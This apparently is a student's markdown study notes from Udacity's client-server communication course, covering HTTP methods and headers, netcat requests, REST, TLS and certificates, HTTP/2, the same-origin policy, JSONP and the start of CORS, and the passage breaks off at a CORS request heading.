### Web

These notes is one of the parts of the ["Client-Server Communication" course](https://eu.udacity.com/course/client-server-communication--ud897) at [Udacity.com](https://www.udacity.com)

##### Clean Up The Subtitles
For each video there is a subtitle file is avalable, use can use the RegEx to clean up the text:
```
\n{0,3}?(\d){1,2}\n[\n\d,: \->]{30}
```

#### 1.1 HTTP Requests
Creator: Tim Berners-Lee

* [on WikiPedia](https://en.wikipedia.org/wiki/Tim_Berners-Lee)
* [on W3C](https://www.w3.org/People/Berners-Lee/)
* [on TED](https://www.ted.com/speakers/tim_berners_lee)
Common abbreviations

* [SGML - Standard Generalized Markup Language](https://en.wikipedia.org/wiki/Standard_Generalized_Markup_Language)
* [HTML - HyperText Markup Language](https://en.wikipedia.org/wiki/HTML)
* [HTTP - Hypertext Transfer Protocol](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol)

#### 1.4 Fetching a Single Request
`GET` - a request for a server to send a data to us.
`POST` - instructs the servers to save the data we are sending.
There are some other methods like [get, delete, add, update]
Let's take a look at usual `GET` request.
```
GET /pictures/kitty.jpg HTTP/1.1
Host: www.google.com
User-agent: Mozilla/5.0
Connection: keep-alive
Accept: text/html
If-None-Match: fd87e6789
```
Structure of the first line of the request:
* `GET` - a _method_ or a _verb_ of the request.
* `/pictures/kitty.jpg` - path and name of the document
* `HTTP/1.1` - version of protocol

#### 1.4 Fetching a Single Request 2
All of the following lines in request except the first one are called - __Header Section__. \
It contains the additional data about the request itself - __headers__. \
A lot of this headers are common and standartized. \
Obligatory headers:
* `Host:` - address of the server
Optional headers:
* `User-Agent:` - what type of browser is making a request
* `Accept:` - what kind of format that browser supports
* `If-None-Match` - what version of the document is available in the browser's local cache

So smallest possible request can look so:
```
GET /pictures/kitty.jpg HTTP/1.1
Host: www.google.com
```

##### HTTP Response
At the first glance a response look very similar to request. The biggest difference is probably the first line:
```
HTTP/1.1 200 OK
Content-Length: 16824
Server: Apache
Content-type: text/html
Date: Wed, 06 Apr 2016
Etag: fd87e6789

<binary data>
```
Here `HTTP/1.1 200 OK` you can fund out the status code of the response `200`, which indicates if your request was fulfilled successfully, if the document was not found or if the server wants to redirect you somewhere else. \
Just like with the _request_ - the next section is a __header section__. It's not only contains data about the document, but also the server and the connection. Again, most of these headers are optional, the only obligatory header is `content-length` - it tells the client how many bytes of data it should expect, after the headers and __an additional empty line__ the actual document is send.

#### 1.6 Getting Multiple Requests
* [Converting HTML to the DOM](https://classroom.udacity.com/courses/ud884/lessons/1464158642/concepts/15290985490923)

#### 1.9 Sending data with a POST Request
So far, we have only been requesting the server to send data to us using the `GET` method.
However, sometimes you might want the user to type in
some data or upload a picture and send that to the server.
This is where the `POST` method comes into play that we mentioned earlier.
With a `POST` request, the request itself can also have a payload or body something we have already seen in responses, but not in requests.
What exactly happens to the data once it has been sent to the server is up to the backend developer and is not in the scope of this course. It is, however, important to know that `POST` requests are potentially
handled differently by proxies and the browser than `GET` requests.
Sometimes you can reload the page and see a confiramation prompt when the page you're currently looking at was the result of a POST request.
If you try to reload such a website,
the browser will prompt you to confirm
this reload action as `POST` requests are allowed to be destructive operations and repeating it might be more destructive than you originally intended. That's why it is usually recommended for the backend developer to not respond to
a `POST` request with a website but with a redirect to avoid this rather jarring behavior.
For the user, this redirect is practically invisible but avoids the prompt on reload.

#### 1.10 From XHR to Fetch
__AJAX__ is a group of web-technologies that let you make a requests programmatically instead of navigating and effectivelly reloading the entire website.
`XMLHttpRequest` or `XHR` for short is the most common way of doing it right now.

##### An XHR Request
The API of XHR's arguably confusing and outdated compared to what JavaScript offers nowadays.
```js
var xhr = new XMLHttpRequest();
xhr.open('Get', '/animals/cat.json', true);
xhr.onreadystatechange = function(e) {
  if (this.readyState == 4 && this.status == 200) {
    console.log(this.responseText);
  }
};

xhr.send();
```
That is why we are going to skip talking about XHR and use its successor instead, Fetch.

##### A Fetch Request
Fetch does the exact same thing but with a cleaner API utilizing promises and therefore integrates much better with the rest of the modern JavaScript APIs.
```js
fetch('/animals/cat.json")
  .then(response => response.text())
  .then(body => console.log(body));
```
If you want to know more about promises, take a look at our cost JavaScript promises linked to it in the instructor notes.
With Fetch you can utilize all the HTTP methods the protocol specifies and have full control of which headers are being sent, well, almost all the headers.

Richard is going to show you a small tool to explore the Fetch API with. Open up the networking tab in your dev tools to see if the browser actually sent the request as you specify

JavaScript Promises
* [JavaScript Promises](https://www.udacity.com/course/javascript-promises--ud898) Udacity Course
* [Promises | Web Fundamentals](https://developers.google.com/web/fundamentals/primers/promises/?hl=en) on Google Developers

#### 1.11 Fetch Quiz
Fetch

* [Introduction to Fetch](https://developers.google.com/web/updates/2015/03/introduction-to-fetch?hl=en) on Google Developers
* [That's so Fetch!](https://jakearchibald.com/2015/thats-so-fetch/) blog post by Jake Archibald
* [JavaScript Promises](https://developers.google.com/web/fundamentals/primers/promises/?hl=en) on Google Developers
* [Using Fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) on MDN

```js
fetch('/password.txt', {
    "method":'PUT',
    'headers': {
        'X-Udacity-Exercise':'some text'
    }
}).then(response => response.text())
  .then(data => console.log(data));
```

#### 2.2 The Netcat Command
##### Netcat
Throughout this lesson we'll be using the [Netcat](https://en.wikipedia.org/wiki/Netcat) command. Netcat is a utility that's used for sending and receiving messages over a network connection. Netcat is known as the Swiss Army knife of networking tools, and we'll be using it to communicate directly with a server.

##### Netcat command
There are many variations of Netcat, and the one I'll be using is accessed with the `nc` command. Here I'm using Netcat to connect to Google on port 80 (the default port for HTTP connections).
![Alt text](https://d17h27t6h515a5.cloudfront.net/topher/2016/June/57509a9e_netcat-example/netcat-example.png)

The prompt waits for us to enter the details of the HTTP request. To send a GET request, enter:
```
GET / HTTP/1.1
```
...then make sure you press the enter button twice (once to get to a new line, and one more to indicate that you're finished entering the request's headers). And you'll get something similar to:
![Alt text](https://d17h27t6h515a5.cloudfront.net/topher/2016/June/57509af5_header-get/header-get.png)

##### Further Research
* https://en.wikipedia.org/wiki/Netcat
* http://nc110.sourceforge.net/

#### 2.3 HTTP Verbs
HTTP has been around for such a long time that the protocol still does something that you'll rarely find in any modern protocol. \
It's regular text and can be read by a human.\
The bytes being pushed back and forth on the network are plain, old, regular text and can be read by our human brains. \
HTTP's simplicity also means that we can directly interact with a protocol without a third party library doing any extra work for us. Every HTTP request begins with a unique verb called a method and serves a specific purpose. We already know `GET` and `POST`. And although these are the most common methods, there are other methods you will encounter regularly. \
The common set of methods consist of `GET`,
`POST`, `PUT`, `DELETE`, `HEAD`, and `OPTIONS`.
We will talk more about these methods when we talk about `REST API`s.

#### 2.4 HTTP Verbs 2
##### HEAD
`HEAD` is an interesting method as it allows you to get the headers of a file without having to receive the entire file itself. This lets you check if there's enough space to store the response or if the cached version on that page is still up to date. This way, the browser can avoid re-downloading a file if it already has the most recent version in its cache.
Looking at the network tab and def tools, you probably won't see any head requests when visiting your websites. \
```
nc example.com 80
HEAD / HTTP/1.1
Host: example.com
```
The problem with using `HEAD` for cache validation is that you're doing twice the work. You send a `HEAD` request and then possibly it get request right afterwards.\
Every request responds pair is called a round trip and they take a lot of time to complete. With a sheer number of access that websites have nowadays, having to send the `HEAD` requests before the potential `GET` request would slow down the loading of the website considerably. There are ways to mitigate the cost off these round trips and will talk about them later. But for now, it is just important to know that we want our sites to have __as few around trips as possible__. \
And that means reducing the number of requests as best as we can.

##### OPTIONS
The last of the common methods is `OPTIONS`. `OPTIONS` is supposed to give you a list of methods that are accepted on the current URL but not every server supports this. \
```
nc example.com 80
OPTIONS / HTTP/1.1
Host: example.com
```
The `OPTIONS` method might seem odd at first,
but becomes very important when we start talking about course which you will cover later.

#### 2.6 Common Response Headers
##### Response Headers
Headers contain additional data about requests or responses. These are some of the important ones:

`Content-Length` is a header that must be contained in every response and tells the browser the size of the body in the response. This way the browser knows how many bytes it can expect to receive after the header section and can show you a meaningful progress bar when downloading a file.

`Content-Type` is also a non-optional header and tells you what type the document has. This way the browser knows which parsing engine to spin up. If it's an image/jpeg, show the image. It’s text/html? Let’s parse it and fire off the necessary, additional HTTP requests. And so on.

`Last-Modified` is a header that contains the date when the document was last changed. It turned out that the Last-Modified date is not very reliable when trying to figure out if a document has been changed. Sometimes developers will uploaded all files to the server after fixing something, resetting the Last-Modified date on all files even though the contents only changed on a subset. To accommodate this, most servers also send out an ETag. ETag stands for entity tag, and is a unique identifier that changes solely depending on the content of the file. Most servers actually use a hash function like SHA256 to calculate the ETag.

`Cache-Control` is exactly what it sounds like. It allows the server to control how and for how long the client will cache the response it received. Cache-Control is a complex beast and has a lot of built-in features. 99% of the time, you only need the “cacheability“ and the “max-age”.

`If-Modified-Since` permits the server to skip sending the actual content of the document if it hasn’t been changed since the date provided in that header. Is there something similar for ETags? Yes there is! The header is called `If-None-Match` and does exactly that. If the ETag for the document is still matching the ETag sent in the If-None-Match header, the server won’t send the actual document. Both If-None-Match and If-Modified-Since can be present in the same request, but the ETag takes precedence over the If-Modified-Since, as it is considered more accurate.

There are a lot more headers and a lot to explore. If you want to know more, check out the following information on HTTP headers:

* [list of HTTP headers](https://www.google.com/url?q=https://en.wikipedia.org/wiki/List_of_HTTP_header_fields&sa=D&ust=1460140076629000&usg=AFQjCNHMTe05Wkomeyd8bB9GvVrUyuC1Dg)

#### 2.8 REST
When writing web apps, you will encounter a lot of API's you'll have to talk to. Some of them might be JavaScript API's that don't involve much more than calling a function in JavaScript, other API's are provided by third parties and require you to make HTP requests yourself. \
A `RESTful API` is one that follows a design
called `REST` that works especially well with HTTP.
`REST` stands for
* `RE`presentational `S`tate `T`ransfer.

But let's be honest that isn't really a very descriptive name. Not all API's follow the REST pattern but many do. So, let's take a look at the underlying concept. \
The basic entities are collections and objects inside those collections. \
The general pattern to retrieve items from collections is using a `GET` request
with both the `<collection name>` and the unique `< item name>` in that collection. \
For example, if I wanted to look up `Richard`, I'd send this request and the server would get the record containing the data about `Richard`.
```
GET persons/Richard
```
If I wanted to update the data in that record, I'd use a `PUT` request and append the updated information to the request.
```
PUT /persons/Richard
```
Every subsequent GET request should now yield the updated record.
A `POST` request is used very similarly with `PUT`, but instead of updating existing records, you use it to create new records.
```
POST /persons/
```
Notice that you do not provide the name under which the new record will be created, but let the server make that choice for you. The response to the `POST` request is usually a redirect to the newly created record. \
And lastly `DELETE` is just what you think it is.
It removes items from the collection.
```
DELETE /persons/Surma
```

#### 2.10 Performance Basics
We have manually written our own request directed to the wire and received a response from the server just as the server send it. \
It feels raw, close to the biometal doesn't it? \
Like there's almost no software between us and the bytes being sent and yet, there's still so much happening that we can't directly see and it actually has a big impact on how fast the entire request response process is. If you are a little familiar with networking architecture, you might know that HTTP is not the entire story, that's merely the protocol. \
For a more complete picture, we are using HTTP on top of TCP, on top of IP, on top of Ethernet. Probably, mostly, maybe. \
The point is, we don't need to understand each of these layers but TCP in particular has a big impact on how we should structure our requests to have them perform well and it warrants a closer look. \
The Internet Protocol allows us to talk to other machines on the internet while TCP allows us to have multiple independent streams of data between these two machines. \
These streams are distinguished by port numbers. The TCP protocol also ensures that no packages get lost and that they arrive in the right order. All of this requires precautions that cost time and resources. Opening a new connection is especially costly as the TCP handshake, which makes sure both machines are aware of the newly created communication channel has to be executed that requires two round trips. \
If you're using HTTPS, the additional TLS handshake has to be executed as well. If HTTPS and TLS are new to you, stick around and we'll talk about them in the next lesson. Once all that is done, the actual HTTP protocol can finally take over. \
Head-of-line blocking is a huge bottleneck to website performance. Browsers being able to open up six parallel connections helps, but it's not great. Later, we'll see how HTTP/2 fix this issues with head-of- line blocking.

#### 2.12 Performance Details 2
Every time the browser connects to a server to make a request, it has to go through the TCP handshake process. This three-way handshake is very time consuming. To counteract the cost of these handshakes, HTTP/1.1 introduced the concept of `Keep-Alive`. \
If the client sets the connection Keep-Alive header, the server will not close the connection after successfully delivering the response, but allows the client to reuse the already established connection for additional requests. \
Keep in mind though, that you still can send requests before the response for the last request has been fully transferred. All in all, this forces web developers to keep the number of additional resources as low as possible, making the best possible use of their six connections. \
This is why JavaScript and CSS files are commonly concatenated into bundles and why images are put together into sprites. The bundles can be obtained in just one request.

#### 3.2 Securing HTTP
At this point, we are painfully aware that HTTP is very easy to read even for humans. You can almost literally want to request fly by on a console and still understand what is going on. So I think we can agree that if someone manages to
somehow eavesdrop on an open HTTP connection, the eServer can read all the requests and responses, and extract all the data they need. \
But how easy is it to eavesdrop on a connection? \
As I mentioned in the introduction, Wi-Fi makes it much easier as you're literally broadcasting your connection over radio waves. So all someone needs to do is listen and with special listening software, it gets even easier. \
* [Firesheep](http://codebutler.com/firesheep)
* [Firesheep Wikipedia entry](https://en.wikipedia.org/wiki/Firesheep)

Encrypting the Wi-Fi will help, but you have no control over the settings of the Wi-Fi at a cafe and old encryptions are easily breakable. That's why one feature of HTTPS is encryption. It will make your browser encrypt requests in a way that only the server you're connected to can decrypt them. Neither the store owner nor the malicious eavesdropper at your local cafe will be able to read your data stream. \
But what if you think you're connected to the right server when you're not?
In a man in the middle attack or MITM for short, the attacker gets between you and the server you're trying to connect to. When this happens, your browser will make an encrypted connection to their server, as if of the server you thought you were trying to connect to, like Facebook. The attacker will decrypt your data, read all of your private information, re-encrypt it and forward it to Facebook's server and vice versa. Neither Facebook nor you would know that they are sitting in the middle. \
To remedy this, HTTPS's other feature besides encryption is authentication. The seller will have to identify itself in a way only the real server could, so you can be sure that you are talking to the right server.

#### 3.4 MITM Quiz 2
##### Invalid Certificate Clarification
An invalid certificate is where the URL for the certificate does not match the URL in the browser's address bar.

#### 3.5 TLS and Certificate Authorities
When we talk about `HTTPS`, we are actually talking about two different concepts. `HTTP` and `TLS`, formerly known as `SSL`. \
We already know about `HTTP`, and `TLS` stands for Transport Layer Security.
`TLS` is not specific to `HTTP`, but any protocol can use it.
For example, there is `FTPS`, which is `FTP` with `TLS`, to transfer files securely.
`TLS` encrypts communication in a way that can't be read by anyone else other than the intended recipients. In practice, it is impossible to break a `TLS` encryption. To ensure that you're talking to the server you intend to talk to,
`TLS` utilizes something called, a _chain of trust_. \
A server identifies itself with a certificate that contains both a little metadata about itself and the fingerprint of its encryption key. These certificates are issued by one of a handful certificate authorities. If that certificate is signed by such an authority, you know that if the key you're using matches that fingerprint, then you're talking to the correct server. \
The list of certificate authorities can actually be found in the browser. You could even add your very own authority if you wanted to. What you see here are mostly companies that you can buy certificates from. They cost money as they not only validate your server, but also validate your identity as the owner of that server. \
Since not every developer can or wants to pay money for a certificate to offer basic security to the users, `"Let's Encrypt"` has come into the market and offer certificates for free. \
Let's take a closer look at how certificates work and the security they provide.

* [File Transfer Protocol (FTP)](https://en.wikipedia.org/wiki/File_Transfer_Protocol)
* [FTPS](https://en.wikipedia.org/wiki/FTPS)
* If you're on Chrome, copy and paste this into your browser to jump to your computer's certificates -
chrome://settings/?search=certificates


#### 3.6 TLS: Cryptography Primer
TLS has two important cryptographic building blocks, encryption and hashing. \
When people think about encryption, they probably think about __symmetric encryption__ - you encrypt some data and give the encrypted data to someone else. The __recipient needs the same key__ to decrypt the data he got or otherwise it will be inaccessible to him. \
With a few mathematical tricks, the browser can utilize encryption algorithms that use __one key for encryption__ and __another one for decryption__. \
Mostly the __keys for encrypting messages are made public__ so that any person that wants to send a message can just go ahead and encrypt with that key. \
The person who has encrypted the message __won't be able to decrypt the message with the same key__. Only you, __who has the decryption key will be able to decrypt it__. Due to the math that is going on under the hood. \
Both keys can actually be used for encryption and decryption. What one key encrypts can only be decrypted by the other. That's why it makes more sense to talk about a __public key__ that is __available to anyone__ and a __private key__ that is only __available to the owner__ and should be stored securely. \
That's why __asymmetric encryption is also called public key encryption__.

#### 3.7 TLS: Hashing
So we have a look at encryption but remember that `TLS` is made up of two parts, `encryption` and `hashing`. \
`Hashing` is the process of transforming data into a short representation of the original data. The __smallest change in the original data__ will have __enormous changes in the hash__. \
If __two documents yield the same hash value__, they are very very likely to be __the same documents__. \
There are a couple of things we care about with hashing functions.
* One, it should be impossible to revert the conversion process, meaning once data has been converted into a hash, it can't be unconverted back into the original data.
* And two, it should be just as impossible to find a different document yielding an identical hash value.

One of the most common hashing functions is `SHA` which exists in multiple flavors like `SHA 256` or `SHA 512` where the number says how big the output of the hash is in bits. \
No matter how big the document is that you pass in, you will always get 256 bits as output when you're using `SHA 256`.

#### 3.9 Certificate Authority Signatures
Now that we have a good grasp on TLS, let's talk about signatures. \
I mentioned certificate authorities earlier, and their job is to sign certificates. But what does it mean, and why would anyone want a signed certificate? \
When we say someone has signed a document, we mean that the certificate authority has reviewed and verified the contents of that document. The purpose is to have some kind of proof that document was seen or even created by that entity. Just like signing your name on a document, it's legal proof that you saw the document, a server can do the same thing with a digital signature. \
When a server signs a document and encrypts it with a private key, they give that back as a signed document. Since only the holder of the private key is able to encrypt documents, you know the document you received is exactly the same as the one the server sent. \
However, documents can become fairly large, think of DVD images for example, and encrypting and decrypting takes a long time with asymmetric ciphers. That's why instead of encrypting the entire document itself, just the hash of the document is encrypted. If you want to check if the signature is valid,
you would decrypt the signature and hash the document yourself to see if those two values match. \
This way, we know that the document we received is exactly the same as when the server sent it. If the document was changed mid-flight, the hash will not match the one provided by the server as its signature. This is called an invalid signature.

#### 3.10 The TLS Handshake
We now have the tools to encrypt data asymmetrically and to assign data. I've said these are the building blocks of TLS and now I will prove it to you. \
Let's go through the process a browser uses to set up a TLS encrypted connection step by step. I will still cut a few corners for simplicity, but nothing integral to the concept. \
1. The first step is having the __server send you a certificate__. The certificate __contains the public key of the server__, some __additional information__ like the domain that the certificate is for, and the __signature__ by a certificate authority.
2. The __client checks if the domain is correct and__ also checks if the authority __signature is valid__. As we already explored earlier, all browsers have a collection of certificate authorities including their public keys saved locally, so it is trivial to check if the signature is valid.
3. Now the __client generates a random key for a symmetric encryption__ to be used from here on in. The browser __encrypts the random key with the server's public key and sends it over__. This has two benefits, symmetric encryption is much faster, more efficient, and scales better to big data compared to asymmetric encryption. But more importantly, the __server__ will __only__ be able to continue communicating __if it is__ truly __in possession of the private key__ and __can decrypt the new random key__.

This effectively validates the servers identity. \
If all of this succeeds, a TLS connection has successfully been established and the AGP protocol can take over. At this point, you'll get the green padlock symbol in your browser's URL bar.

#### 3.11 SSL Error Quiz
* Open https://badssl.com/
* Go to `sha1-2016`

#### 3.12 Mixed Content
If our index document is served over HTTPS, great. But what about the site's assets, are they surfed over HTTPS as well? \
A fast way to break that beautiful green lock is having your assets surfed over a regular HTTP. When this happens, the site ends up in a state called Mixed Content. Mixed content occurs when you open a website that is supposed to be
delivered over HTTPS but includes resources like images, Iframe, stylesheets or scripts from non TLS secured origins. \
A popular mistake is pulling in jQuery from a non TLS enabled CDN. Depending on the type of resources that is being included over a nonsecure channel, the consequences might differ. It might cost you a green padlock but still remain functional. The resource might get block or break your page or it might even get the horrible red padlock of shame. \
The behavior differs across different browsers so it should definitely avoid and check a website for mixed content. In fact, Google recommends that you'd surf all your assets over HTTPS. This way, you'll avoid mixed content mornings and your site and its assets will be transferred securely.

* [Mixed content on MDN](https://developer.mozilla.org/en-US/docs/Security/Mixed_content)

#### 4.1 HTTP/2 Intro
HTTP has been around since the early 90s. Between just 2010 and 2015, the amount of data transferred for a single web page has tripled. The number of requests necessary to get all that data is on a steady rise as well. \
HTTP is used for things and in conditions that are very different from what it was designed for. Design choices that made complete sense back then are now becoming a burden both in terms of development and performance. \
Some current best practices like concatenating all your JavaScript into a single file solely exist to work around the shortcomings of HTTP1. This is where HTTP2 comes in. \
While also being backwards compatible, it solves the biggest issues HTTP1 has. We will learn how HTTP2 is different from HTTP1 and how these differences help make your apps better.

#### 4.2 HTTP/1 Problem: Head of Line Blocking
The average number of requests needed to properly display a website rises constantly and has recently risen over 100. That means on average, a website requires over 100 requests to display correctly. Things are getting a little crazy. Remember that HTTP 1 does not work well with lots of requests. Fortunately HTTP 2 has come to the rescue. \
We'll look at some problems of HTTP 1 and how HTTP 2 is solving them. \
One of the reasons we have so many requests, is because of __Head of Line blocking__. We talked about this earlier, but it's so important. Let's briefly go over it again. \
__Head of Line blocking__ is when one request is blocking others from completing. A browser will open at most six connections to the same server. That means at most six requests can be in-flight simultaneously. At the very least, you'll have to wait for the request to be sent and then the response to be sent back. These two together are called the round trip. And the round trip time can take between 20 to 50 milliseconds on a good connection. \
Let's do some quick math. Let's say a site needs to send 100 requests to load completely. We can handle six requests in parallel, which means ideally each connection will need to make 17 requests to download all 100 requests. With each request having a round trip time averaging roughly 35 milliseconds. This yields 525 milliseconds. \
About half a second of waiting, of doing nothing. And this assumes that actually transferring the requested file doesn't take any time at all. If the file being transferred is large, then this number will become a lot bigger. This round-trip time is an average. If there's an unstable or slow Internet connection, things only get worse. \
__Head of Line blocking__ is a disaster to good loading performance of a website. With HTTP 2, we don't have to worry about Head of Line blocking.

Further research:
* [Rising number of requests](http://httparchive.org/trends.php?s=All&minlabel=Nov+15+2010&maxlabel=May+15+2016)

#### 4.3 HTTP/1 Problem: Uncompressed Headers
To reduce the time it takes to send data, a lot of websites compress their assets with Gzip or other compression algorithms that work on the web. The H.T.
modified boilerplate project uses the Gzip compression. \
Check below for more information about this.
* [gzip in HTML5 Boilerplate project](https://github.com/h5bp/html5-boilerplate/blob/master/dist/.htaccess#L709-L795)
* [White paper on SPDY](http://dev.chromium.org/spdy/spdy-whitepaper)

Compression of the data is great, but the request and response headers are still being sent uncompressed. When you think about it, that doesn't make a lot of sense. They are plain text which makes them highly compressible. Also they repeat a lot across requests. The host header's always the same, the cookies are the same, and so are some other headers.
In a Google's research paper, they state that on average, headers take up about 800 bytes. Let's look at the potential savings we could have. If a site made 100 requests, roughly 80 kilobytes of data would be taken up by the headers and most of that would be redundant. We'd save a lot of space if we could compress the headers. Unfortunately, we can't do that with HTTP/1. But with HTTP/2, we can!

#### 4.4 HTTP/1 Problem: Uncompressed Headers
A completely different aspect that HTTP2 tackles is security. E-commerce has become the norm and so has handling sensitive data like credit cards and contracts. It's fair to call it gross negligence if websites handle this kind of data without TLS. \
That's why TLS is a required part of the specification for HTTP2. There is an unencrypted version of HTTP2, but all major browsers have opted out of supporting it. We've talked about TLS before and you'll be glad to hear that nothing's changed when using TLS with HTTP2. \
But how does HTTP2 solve the other problems? \
How does it resolve head of line blocking? \
And how does header compression work in HTTP2? \
Let's find out.

#### 4.5 HTTP/2 Improvements
So, Richard just showed you some of the flaws with HTTP/1 and said that HTTP/2 would solve them. But how does he do it? Well, take out your note-taking pencil
because I'm about to show you the wonders of HTTP/2. \
Remember the human readability of requests and response headers?
```
GET index.html HTTP/1.1
Host: www.google.com
User-agent: Mozilla/5.0
Connection: keep-alive
Accept: text/html
If-None-Match: fd87e6789
```
Well, that's going to go. \
* It's the first step to improve performance with HTTP/2. It was nice while it lasted but nobody is really benefiting from the plain text approach that HTTP/1 took. We are wasting precious bytes by spelling things out in text form when a single bit is sufficient. Don't worry, though. Tools like _Wireshark_ or _dev tools_ will still let you see headers even with HTTP/2. \
* The second big problem HTTP/2 solves is head-of-line blocking. It does this through a technique called __multiplexing__.
__Multiplex__ definition: \
A system or signal involving simultaneous transmission of several messages along a single channel of communication.
__Multiplexing__ is a fancy sounding term that means combining multiple signals into a new single signal. With HTTP/2, we now have one connection instead of six. That seems like a terrible step backwards at first but we are using the single connection differently than HTTP/1 would have. \
What used to be a __dedicated connection__ in HTTP/1 is now called a __stream__ and all streams share that single connection. These streams are split up into frames and are being multiplexed onto that single connection. \
When one stream is blocked, another stream can take over the connection and make good use of what would have been idle time. Head-of-line blocking be gone. \
* Lastly, HTTP/2 takes care of header that are big uncompressed. With HTTP/2, headers are not just being compressed with key zip. The engineers came up with an HTTP/2 compression that is tailored towards the specific structure of headers and the multiplexing feature of HTTP/2. All streams not only share the connection but also the compressor. \
This means a header never has to be sent twice since the compressor recognizes that it's been sent before and sends a reference instead. For example cookies are really long headers, so it is an enormous advantage to say, "Inject the same cookie header as thread requests ago here instead of the actual value".

I won't go into the intricacies of this compression algorithm. But if you're interested in how it works, there is some additional reading in the instructor notes.
* [HPACK - Header Compression for HTTP/2](https://http2.github.io/http2-spec/compression.html)

#### 4.6 Working with HTTP/2
HTTP/2 brings a lot of changes. \
But how do we transition from HTTP/1 to this amazing HTTP/2 world? \
What do we have to do to cater to all the units out here in the best possible manner? With head-of-line blocking gone in HTTP/2, and the new header compression requests are now cheap. So things like concatenating your JavaScript or CSS are not necessary anymore, and it can actually make things worse. Think about updating a cached file. If you fix a typo in a JavaScript file, like a missing curly brace, you would force your users to redownload the entire concatenated blob of JavaScript,instead of just the fragment that actually changed. If each JavaScript file was separate, you would only invalidate the cache on that single file. \
Another advantage is the new header compression becoming more effective the more requests are sent. The more requests are sent, the more headers can be reused. That means that having multiple connections to different servers is actually bad for your performance. That being said, minifying and compressing your JavaScripts, CSS, and images is still a good idea. \
A byte saved is a bytes saved. And especially in developing countries, that means saved money. \ Additionally, all the advice given for rendering performance like deferring a JavaScript or in-lining styles is still valid and so is investing time in building proper offline support with service worker. Most importantly, HTTP/2 is backwards compatible. \
All servers that speak HTTP/2, will be able to speak HTTP/1. A client that can't speak HTTP/2 will just fall back to HTTP/1, and keep working as before. And those clients are becoming exceedingly rare. So don't be scared of working with HTTP/2. \
At the time of filming in early 2016, 71 percent of the webs traffic have support for HTTP/2. So, it is fair to say that you can optimize your web for HTTP/2, without paying much attention to HTTP/1 anymore, as this number will only grow.
Further researches:
* [Check out our course on Service Worker](https://www.udacity.com/course/offline-web-applications--ud899)
* [Current support of HTTP/2 from caniuse.com](http://caniuse.com/#feat=http2)

#### 5.1 Security Intro
Thanks for coming back. Now, you might be asking yourself, why are we talking about security again? I mean, we've already talked about TLS and its use in HTTPS. \
HTTPS covers many angles of attack for things like eavesdropping on your traffic or just impersonating the web server as a whole. However, the most secure front door in the world will not be worth anything if there's a letter to the first floor window. The letter, being your web app. \
HTTP contains some very subtle security risk. On top of that, the history and backwards compatibility of the HTTP protocol carries a lot of baggage from a time where security wasn't as big of a topic as it is now. \
In this lesson, we are going to learn how certain design choices could have allowed an attacker to steal sensitive data and how you, as a web developer, can protect a web app against such attacks.

#### 5.2 Origins
As a general rule of thumb, __JavaScript is not allowed to access the data of any other origin than its own__. \
An origin is made up of three parts:
* the `Data Scheme`,
* the `Hostname`,
* and the `Port`.

For the page you're on right now,
* the scheme is `https://`,
* the Host name is `www.udacity.com`,
* and the port is `:443`.

If you change any of these parts, you are on a different origin and different rules will apply. Apart from the mixed content problems we talked about, earlier this is another reason to not mix HTTP and HTTPS URLs. \
But what are these rules that apply once you are working across multiple origins? \
First of all, you can't make fetch requests to other origins. Actually, under certain criteria, you can, but then you can't read the answer. Secondly, you cannot inspect eye frames or windows with JavaScript if they are from another origin. \
These rules make a lot of sense if you think about it. Let's assume I was allowed to make fetch requests to other origins. I could just set up a website that makes fetch requests to Facebook.com and steal all your Facebook messages,
or even worse, I could make fetch request to udacity.com and make you drop out of all of your Udacity classes. \
No, we don't want that. \
This restriction or rule is called the __same origin policy__.
Further research:
* [Same Origin Policy](https://www.w3.org/Security/wiki/Same_Origin_Policy)

#### 5.3 Origins 2
Simon just gave you some rules. But if there are rules, then there are exceptions to those rules. \
As you're very well aware of, we are allowed to include stylesheets, images, videos, iframes, and even scripts from other origins as well as send form data to other origins. \
The end user won't be able to tell that one image is loaded from our server, while another is loaded from Instagram. \
However, for web developers there is a difference. \
You can't interact with an image tag that is showing a cross origin image in the same way you could with an image from the same origin. \
For example,
* you can't inspect the pixels of the image from inside the canvas element.
* The same goes for a script tag that includes a cross origin script resource.

The contents will either just silently appear empty, or in case of more modern APIs, it will explicitly throw an error.\
For the same origin script tag, I have access to its contents. But I can't access the other origin script contents. \
It's important to keep in mind that the user's browser is the one who enforces the same origin policy. It's not the server but the client that will not let you send off requests. \
We'll see why this is important, as we look into getting around same origin policy restrictions in the next video.

#### 5.4 Overriding Same Origin Policy
Sometimes, you want to allow other people to access your resources even if they are from another origin. This is mostly relevant for API providers who want other sites to be able to use the service but the same origin policy prevents this. \
Nowadays, you can easily achieve the sharing of resources with a set of AGP address called __Cross Origin Resource Sharing__ or __CORS__ for short. \
This is the most powerful engineering solution to the single origin problem. But up until a few years ago, the browser support for CORS was rather lacking and people had to come up with their own techniques to work around the single origin policy in the meantime. \
One of the oldest techniques is called __JSONP__, __JSON with padding__. \
Instead of simply returning data, JSONP returns a script containing the data. This exploits the fact that the scripts from other origins will execute and share the execution environment with your own scripts. \
JSONP-based APIs expect to include the function name as a query parameter. The server will return a new script calling the function that you named. \
Let's look at a fictional example. \
Let's say we are building an app at `yourcourselist.com` that wants to list all the Udacity courses the user is enrolled in. The naive approach would be to make a fetch request to API `udacity.com` and use the return data to generate a list for the user. \
```js
// following fetch will fail
fetch("https://api.udacity.com/courses?status=enrolled")
```
However, this will fail with the security exception as your host differs from Udacity's host. \
How would this API look if it supports JSONP? \
Add a function name to the URL and include it with a script tag.
```js
// Cross-origin script access is allowed!
<script src="https://api.udacity.com/courses?status=enrolled&callback=f">
```
The server will wrap all the data means to return in a function call with the same name as given via the query parameter. \
You need to define this function `f` because when the responses return, the function call is executed and you now have access to the data to the parameter of that function.
```js
f(['course1', 'course2', ...])
```
Further researches:
* [JSBin Example](https://jsbin.com/roxapu/3/edit?html,js,console)

##### Message passing
Another technique that was explicitly designed to allow cross-origin communication is called message __passing__. `postMessage()` is a function that can be called to pass a message to other `windows` and `iframes`, even if they come from a different origin. \
This creates a message event you subscribe to like any other event. For security, the receiver can inspect the message’s origin and content.

While `postMessage` is much cleaner and allows more granular control than the other cross-origin options, it sadly hasn’t been as widely adopted by API providers.

#### 5.5 CORS
CORS has been adopted by API providers as the primary way to share resources. \
CORS headers permit cross origin requests without relying on Javascript, though they do need some server side code. \
CORS sort us allow service to specify a set of origins that are allowed to access its resources. \
Request:
